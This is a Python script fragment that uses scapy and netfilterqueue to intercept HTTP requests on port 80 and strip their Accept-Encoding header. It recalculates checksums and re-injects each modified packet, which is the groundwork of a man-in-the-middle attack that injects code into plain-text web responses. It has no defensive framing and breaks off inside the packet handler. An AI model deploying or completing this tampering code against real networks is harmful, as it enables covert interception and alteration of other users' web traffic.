from scapy.all import *
from colorama import init, Fore
import netfilterqueue
import re

init()

GREEN = Fore.GREEN
REST = Fore.RESET


def process_packet(packet):
    # executed whenever the packet is sniffed

    # convert the netfilterqueue packet into scapy packet
    spacket = IP(packet.get_payload())

    if spacket.haslayer(Raw) and spacket.haslayer(TCP):

        if spacket[TCP].dport == 80:

            print(f"[*] Detected HTTP Request from {spacket[IP]}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded
                # forward the packet exit the function
                packet.accept()
                return

            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically 
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None

            packet.set_payload(bytes(spacket))

        